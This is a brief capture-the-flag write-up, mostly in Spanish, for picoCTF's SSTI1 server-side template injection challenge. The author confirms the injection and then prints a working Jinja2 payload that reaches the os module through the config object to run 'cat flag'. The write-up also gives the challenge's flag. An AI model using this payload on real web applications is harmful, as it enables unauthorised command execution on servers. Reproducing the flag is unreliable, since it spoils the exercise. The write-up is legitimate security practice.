
## Descripción 

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:61330/)!
### pista

Server Side Template Injection
## Solución

- Entramos en la pagina.
![[05-SSTI1_IMG1.png]]
- Verificamos si la plantilla es vulnerable.
![[05-SSTI1_IMG2.png]]
- Una vez que sabemos que es vulnerable obtenemos la clase del objeto config, obtener sus variables, etc.
![[05-SSTI1_IMG3.png]]
- ponemos el siguiente payload: {{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
- Vemos que obtenemos la bandera.
![[05-SSTI1_IMG4.png]]



```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}
```

## Referencias

- https://youtu.be/qji8Wp0-1Rs?si=Ic6Wl4KxwzrgmrL-